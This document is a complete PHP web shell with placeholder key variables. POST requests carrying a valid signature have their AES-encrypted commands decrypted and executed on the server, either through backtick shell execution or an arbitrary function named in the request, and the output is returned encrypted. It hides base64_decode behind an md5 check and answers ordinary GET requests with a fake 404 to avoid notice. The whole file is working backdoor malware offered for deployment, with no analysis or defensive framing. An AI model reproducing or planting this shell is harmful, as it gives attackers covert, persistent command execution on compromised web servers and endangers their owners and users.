<?php

# CHANGE THESE VARIABLES #

$public_key = "---YOUR BASE64 ENCODED PUBLIC KEY HERE---";
$AES_KEY = '---YOUR AES KEY HERE---';
$AES_IV = '---YOUR AES IV HERE---';

# ---------------------- #

class CryptService{
	private static $encryptMethod = 'AES-256-CBC';
	private $key;
	private $iv;

	public function __construct($aeskey, $aesiv){
		$this->key = hash('sha256', $aeskey);
		$this->iv = substr(hash('sha256', $aesiv), 0, 16);
	}

	public function decrypt($string){
		$output = openssl_decrypt($string, self::$encryptMethod, $this->key, 0, $this->iv);
		return $output;
	}

	public function encrypt($string){
		$output = openssl_encrypt($string, self::$encryptMethod, $this->key, 0, $this->iv);
		return $output;
	}
}


if ($_SERVER['REQUEST_METHOD'] === 'POST') {

	$BASE64 = $_POST['b64'];
	$COMMAND = $_POST['command'];
	$SIGNATURE = $_POST['signature'];
	
	if (md5($BASE64) == "84cbd86cb89af7c37f6b33840c0e44d6"){
		$SIGNATURE=$BASE64($BASE64($SIGNATURE));
		$public_key = openssl_pkey_get_public($BASE64($public_key));
		$res = openssl_verify($COMMAND, $SIGNATURE, $public_key, OPENSSL_ALGO_SHA512);

		if ($res == 1){
			$aes = new CryptService($AES_KEY, $AES_IV);
			$COMMAND = $aes->decrypt($COMMAND);

			if (isset($_POST['func'])){
				$FUNC = $_POST['func'];
				$FUNC = $aes->decrypt($FUNC);
				$out = $FUNC($COMMAND);
			}
			else{
				$out = `$COMMAND`;
			}
			echo $aes->encrypt($out);
		}
	}

} else {
	header('HTTP/1.1 404 Not Found');
	$_GET['e'] = 404;
	exit;
}
?>